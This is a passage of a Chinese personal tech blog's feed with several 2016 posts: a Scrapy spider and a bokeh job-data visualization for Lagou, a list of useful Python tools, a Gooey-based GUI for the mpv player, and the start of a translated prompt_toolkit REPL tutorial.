&lt;p&gt;我最初想爬取主流招聘网站的数据，考虑到工作量，选取了最喜欢的&lt;a href="http://www.lagou.com/"&gt;拉勾网&lt;/a&gt;，后期要拓展数据集只是体力活&lt;/p&gt;
&lt;p&gt;目前&lt;a href="https://github.com/wwj718/jobSpider"&gt;jobSpider&lt;/a&gt;jobSpider是一只爬取拉勾网的&lt;a href="https://github.com/scrapy/scrapy"&gt;scrapy&lt;/a&gt;爬虫，用于爬取职位信息。拉钩的数据接口非常漂亮，以至于这个项目本质上都不能算爬虫，它直接请求拉勾网的接口，获得漂亮的json数据，核心代码很短：&lt;a href="https://github.com/wwj718/jobSpider/blob/master/lagou/spiders/lagou_spider.py"&gt;lagou_spider.py&lt;/a&gt;，不用一分钟看完&lt;/p&gt;
&lt;p&gt;默认拉勾网会给出最新的5000条数据，如果你想爬取更多（比如研究职位变化趋势、从职位看行业热门），那么你需要进一步了解拉钩的数据接口&lt;/p&gt;
&lt;p&gt;为了对数据有个感性认知，我们来看下数据接口，可以在你的浏览器里打开&lt;a href="http://www.lagou.com/jobs/positionAjax.json"&gt;positionAjax&lt;/a&gt;，最好你的浏览器（chrome）装有JSONView插件，这样数据看去笔记层次分明&lt;/p&gt;
&lt;p&gt;至于我们是如何拉钩网友接口的，这就是体力活的，通过不段尝试（每个网站不尽相同），我是通过chrome的调试工具&lt;/p&gt;
&lt;p&gt;爬虫很简单，你读完scrapy的入门教程（&lt;a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html"&gt;中文教程&lt;/a&gt;）就能看懂了&lt;/p&gt;
&lt;p&gt;我在源码里给出了参考资源&lt;/p&gt;
&lt;h3&gt;可视化部分&lt;/h3&gt;
&lt;p&gt;要理解可视化部分:&lt;a href="https://github.com/wwj718/jobsVisualization"&gt;jobsVisualization&lt;/a&gt;，你可能需要对&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;和&lt;a href="https://github.com/bokeh/bokeh"&gt;bokeh&lt;/a&gt;。不过放心需要的都是入门级别的知识，稍微先过一下下门文档，遇到不懂回去查就好&lt;/p&gt;
&lt;h4&gt;bokeh&lt;/h4&gt;
&lt;p&gt;bokeh是一个非常酷的Python 交互式可视化库，在数据科学家聚集的&lt;a href="https://www.kaggle.com/"&gt;kaggle&lt;/a&gt;社区，被广泛使用，bokeh非常使用用来设计数据驱动的交互式应用，而我们让用户可视化地选择合适的工作，便是典型的此类应用。&lt;/p&gt;
&lt;p&gt;如果你对数据分析和可视化感兴趣，并向做出好玩的东西给别人试试，bokeh不容错过&lt;/p&gt;
&lt;p&gt;pandas太过有名，就不单独介绍了&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;等你看完pandas和bokeh的入门教程，就可以轻松阅读这个项目啦，不到不懂google就好&lt;/p&gt;
&lt;p&gt;这个项目也很简单，实际就是一个文件:&lt;a href="https://github.com/wwj718/jobsVisualization/blob/master/main.py"&gt;main.py&lt;/a&gt;，数据源为:&lt;a href="https://github.com/wwj718/jobsVisualization/blob/master/lagouSpider-newest.csv"&gt;lagouSpider-newest.csv&lt;/a&gt;，这个就是我们爬虫每天爬去的职位数据，是可视化应用的数据来源&lt;/p&gt;
&lt;p&gt;可视化部分的运作流程为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户在浏览器里选择期待的地理位置、薪资、福利&lt;/li&gt;
&lt;li&gt;数据被传到后台，pandas根据用户的条件，从爬虫采集的数据里过滤出合适的，并返回&lt;/li&gt;
&lt;li&gt;浏览器将这些结果可视化&lt;/li&gt;
&lt;li&gt;用户直观看到合格数据在一个二维空间的分布，可以直观上进行对比选出最合适的&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上的可视化和用户界面以及数据在网络的传输这些繁琐的杂货就是bokeh做的&lt;/p&gt;
&lt;h3&gt;部署成网站！&lt;/h3&gt;
&lt;p&gt;我已经将它部署成线上应用了:&lt;a href="jobs.just4fun.site/jobsVisualization"&gt;jobsVisualization&lt;/a&gt;，你如果熟悉服务器和网站部署，也可以部署到自己的服务器上，相关文档我写在项目首页了:&lt;a href="https://github.com/wwj718/jobsVisualization"&gt;jobsVisualization&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Aug 2016 00:00:00 +0000</pubDate><guid>tag:,2016-08-01:jobsVisualization.html</guid><category>data</category></item><item><title>一些好用的工具</title><link>/awesome-tools.html</link><description>&lt;h1&gt;周末大淘金&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/mitsuhiko/unp"&gt;unp&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;python包（pip install unp），能解压主流的压缩包：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;*.7z&lt;/li&gt;
&lt;li&gt;*.bz2v&lt;/li&gt;
&lt;li&gt;*.tar.gz&lt;/li&gt;
&lt;li&gt;*.rar&lt;/li&gt;
&lt;li&gt;&lt;em&gt;.zip; &lt;/em&gt;.egg; &lt;em&gt;.whl; &lt;/em&gt;.jar&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用: &lt;code&gt;unp myarchive.rar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mac下解压工具很难用，可以试试unp&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit"&gt;python-prompt-toolkit&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;强大的交互式命令行构建框架&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/ronnix/fabtools"&gt;fabtools&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;方便地写fabric脚本&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/mitsuhiko/pluginbase"&gt;pluginbase&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;一个灵活的python插件系统&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/sloria/doitlive"&gt;doitlive&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;现场的命令行演示，可以预先输入脚本，然后像放ppt一样运行他们，每个指令都会现场真是执行&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/Zulko/moviepy/"&gt;moviepy&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;使用python做视频编辑&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/jmcarp/robobrowser"&gt;robobrowser&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;基于python的无壳浏览器&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/gak/pycallgraph"&gt;pycallgraph&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;将python代码的调用栈可视化&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/Kozea/wdb"&gt;wdb&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;可看做web版的pdb&lt;/p&gt;
&lt;p&gt;mac不可用&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/mitsuhiko/pipsi"&gt;pipsi&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;使一般用户能安装系统级别的pip依赖&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/mitsuhiko/python-regex-scanner"&gt;python-regex-scanner&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;正则提取，scanner&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/jflesch/paperwork/wiki#for-developers"&gt;paperwork&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;文档查询 ocr （linux only）&lt;/p&gt;
&lt;p&gt;docker安装：https://github.com/jflesch/paperwork/blob/unstable/doc/install.docker.markdown&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/amperser/proselint"&gt;proselint&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A linter is a computer program that, like a spell checker, scans through a document and analyzes it&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是个非常酷的项目，对你的文章进行检查，并给出建议，就像对你的代码做静态分析&lt;/p&gt;
&lt;h3&gt;&lt;a href=""&gt;ncdu&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;找出系统大文件&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 31 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-31:awesome-tools.html</guid><category>tools</category></item><item><title>为mpv写一个简单的图形界面</title><link>/mpv_gui.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;几个月前给朋友推荐过mpv，朋友非技术人员，而mpv只提供命令行工具，没有图形界面，周末下午逛github看到&lt;a href="https://github.com/chriskiehl/Gooey"&gt;Gooey&lt;/a&gt;，觉得简单有趣，决定用它给mpv写一个简单的图形界面&lt;/p&gt;
&lt;h1&gt;需求&lt;/h1&gt;
&lt;p&gt;需求很简单，通过点击桌面图标，之后选择电影文件，就能播放，而不需要使用图形界面，这应该是大多非技术用户习惯的操作。&lt;/p&gt;
&lt;h1&gt;一些介绍&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/mpv-player/mpv"&gt;mpv&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;mac下常见播放器有QuickTime，MplayerX，VLC。我之前用MplayerX居多，mpv 是 Mplayer 和 Mplayer2 项目的分支，目前活跃的开发者都转向开发 mpv。mpv基本可以满足一般用户的需要&lt;/p&gt;
&lt;p&gt;mac下不同播放器的比较参考&lt;a href="https://www.zhihu.com/question/19552878"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/chriskiehl/Gooey"&gt;Gooey&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Turn (almost) any Python command line program into a full GUI application with one line&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Gooey能轻易地把python命令行工具变为GUI应用，通过极少的代码&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;h3&gt;mpv&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;brew tap mpv-player/mpv
brew install mpv
which mpv &lt;span class="c1"&gt;# /usr/local/bin/mpv&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用:&lt;code&gt;mpv /your/folder/yourfile.mp4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mpv在mac目前没有图形界面&lt;/p&gt;
&lt;h3&gt;Gooey&lt;/h3&gt;
&lt;p&gt;pip install Gooey  //需要在sudo pip下安装，wxpython要求比较多,virtuanenv下比较麻烦，具体可以参考&lt;a href="https://wiki.wxpython.org/wxPythonVirtualenvOnMac"&gt;wxPythonVirtualenvOnMac&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;依赖&lt;code&gt;wxpython&lt;/code&gt;，安装&lt;code&gt;wxpython&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;brew install wxpython
&lt;span class="nb"&gt;cd&lt;/span&gt; /Library/Python/2.7/site-packages    
ln -s /usr/local/Cellar/wxpython/3.0.2.0/lib/python2.7/site-packages/wx-3.0-osx_cocoa/wx/ wx
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;上源码&lt;/h1&gt;
&lt;p&gt;cat mpv_gui.py&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="c1"&gt;#import argparse&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;gooey&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Gooey&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;GooeyParser&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;
    &lt;span class="c1"&gt;# 播放，调用系统服务（mpv）&lt;/span&gt;
    &lt;span class="n"&gt;mpv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/usr/local/bin/mpv&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;# todo:变为独立进程&lt;/span&gt;
    &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Popen&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;mpv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="nd"&gt;@Gooey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chinese&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GooeyParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;mpv_gui&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;请选择电影文件&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;widget&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FileChooser&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="n"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;h3&gt;点击执行&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mv mpv_gui.py mpv_gui
chmod +x mpv_gui
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后点击mpv_gui文件即可选择播放电影&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/mpv_guif12d19d5.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/mpv_gui28719e66a.png" /&gt;&lt;/p&gt;
&lt;p&gt;如果你想把这个工具打包成无依赖的系统软件，可以试试pyinstaller&lt;/p&gt;
&lt;h3&gt;todo&lt;/h3&gt;
&lt;p&gt;Gooey安装不方便，文件选择用tkinter的tkFileDialog就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Tkinter&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Tk&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;tkFileDialog&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;askopenfilename&lt;/span&gt;

&lt;span class="n"&gt;Tk&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;withdraw&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# we don&amp;#39;t want a full GUI, so keep the root window from appearing&lt;/span&gt;
&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;askopenfilename&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# show an &amp;quot;Open&amp;quot; dialog box and return the path to the selected file , 在命令行下层？&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;后来发现可以直接安装mpv.app，之后绑定格式和播放工具 （参考 &lt;a href="http://songchenwen.com/tech/2015/05/09/mpv-player/"&gt;全能高效的播放器 mpv&lt;/a&gt;）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;brew install mpv --with-bundle
brew linkapps mpv
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 31 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-31:mpv_gui.html</guid><category>tools</category></item><item><title>[译]使用Python Prompt Toolkit构建强大的REPL</title><link>/python-prompt-toolkit.html</link><description>&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/6.png?raw=true" /&gt;&lt;/p&gt;
&lt;p&gt;原文参考&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit/tree/master/examples/tutorial"&gt;Build a REPL With Python Prompt Toolkit&lt;/a&gt;,很喜欢这篇教程，清晰简单，读起来十分舒服，翻译过来分析给大家&lt;/p&gt;
&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;正式开始翻译之前，我们先了解一些背景知识&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit"&gt;python-prompt-toolkit&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;python-prompt-toolkit是一个用于构建强大交互式命令行的 Python 工具库,许多好用而智能的命令行工具都构建在它上边&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ipython&lt;/li&gt;
&lt;li&gt;ptpython&lt;/li&gt;
&lt;li&gt;mycli&lt;/li&gt;
&lt;li&gt;pgcli&lt;/li&gt;
&lt;li&gt;xonsh&lt;/li&gt;
&lt;li&gt;gitsome&lt;/li&gt;
&lt;li&gt;http-prompt&lt;/li&gt;
&lt;li&gt;aws-shell&lt;/li&gt;
&lt;li&gt;haxor-news&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你用过其中的一些，你会惊叹于他们的智能和良好的交互式体验（就像fish）, 这些工具的背后便是我们今天的主角:&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit"&gt;python-prompt-toolkit&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;REPL&lt;/h3&gt;
&lt;p&gt;全称Read-Eval-Print Loop("读取-求值-输出"循环)，是一个简单的，交互式的编程环境.&lt;/p&gt;
&lt;p&gt;REPL使得探索性的编程和调试更加便捷，因为“读取-求值-输出”循环通常会比经典的“编辑-编译-运行-调试”模式要更快&lt;/p&gt;
&lt;h1&gt;译文&lt;/h1&gt;
&lt;p&gt;本文教你使用&lt;a href="https://github.com/jonathanslenders/python-prompt-toolkit"&gt;prompt_toolkit&lt;/a&gt;来构建SQLite数据库的命令行工具&lt;/p&gt;
&lt;p&gt;prompt_toolkit是一个用于构建强大交互式命令行的 Python 工具库&lt;/p&gt;
&lt;p&gt;首先让我们用pip安装它：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pip install prompt_toolkit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;搞起!&lt;/p&gt;
&lt;h3&gt;读取用户输入&lt;/h3&gt;
&lt;p&gt;使用&lt;code&gt;prompt&lt;/code&gt;方法接收用户输入&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You entered:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/1.png?raw=true" /&gt;&lt;/p&gt;
&lt;h3&gt;REPL循环&lt;/h3&gt;
&lt;p&gt;现在让我们在一个while循环里调用&lt;code&gt;prompt&lt;/code&gt;方法，同时将输入历史保存在&lt;code&gt;InMemoryHistory&lt;/code&gt;对象里&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.history&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;history&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You entered:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GoodBye!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="" src="https://github.com/jonathanslenders/python-prompt-toolkit/blob/master/examples/tutorial/screenshots/2.png?raw=true" /&gt;&lt;/p&gt;
&lt;h3&gt;语法高亮&lt;/h3&gt;
&lt;p&gt;我们已经做了一些基础工作，现在让我们将语法高亮加入到用户的输入中。我们知道用户将会输入sql语句，我们可以使用&lt;a href="http://pygments.org/"&gt;Pygments&lt;/a&gt;来高亮用户的输入.&lt;code&gt;lexer&lt;/code&gt;参数允许你设置词法分析器(译者注：lexical analyzer，简称lexer)，我们将使用Pygments 库的&lt;code&gt;SqlLexer&lt;/code&gt;来对输入做高亮处理：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;prompt&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;prompt_toolkit.history&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pygments.lexers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SqlLexer&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;InMemoryHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
